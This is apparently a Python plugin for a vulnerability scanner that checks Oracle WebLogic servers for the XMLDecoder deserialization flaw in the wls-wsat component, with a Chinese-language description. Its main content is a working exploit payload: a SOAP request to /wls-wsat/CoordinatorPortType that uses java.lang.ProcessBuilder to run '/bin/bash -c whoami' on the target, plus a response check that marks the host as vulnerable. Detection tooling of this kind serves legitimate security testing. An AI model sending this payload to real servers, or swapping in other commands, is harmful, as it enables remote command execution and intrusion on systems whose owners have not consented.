# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Weblogic XMLDecoder 反序列化漏洞",
        "description": "Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。",
        "references": ["-"],
    }

    # def __condition__(self):
    #     return self.condition(
    #         matches=[
    #             {
    #                 "search": "body",
    #                 "keyword": "Welcome to Weblogic Application Server"
    #             },
    #             {
    #                 "search": "body",
    #                 "keyword": "/console/framework/skins/wlsconsole/images/login_WebLogic_branding.png"
    #             }
    #         ]
    #     )

    def url(self) -> dict:
        r = self.request(
            method='POST',
            path='./wls-wsat/CoordinatorPortType',
            timeout=15,
            headers={'content-type': 'text/xml'},
            data=f"""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0">
              <string>/bin/bash</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>whoami</string>
            </void>
          </array>
          <void method="start"/>
        </object>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
                            """
        )
        if 'java.lang.ProcessBuilder' in r.text or '<faultstring>0' in r.text:
            return {"LoopholeInfo": self.__info__}
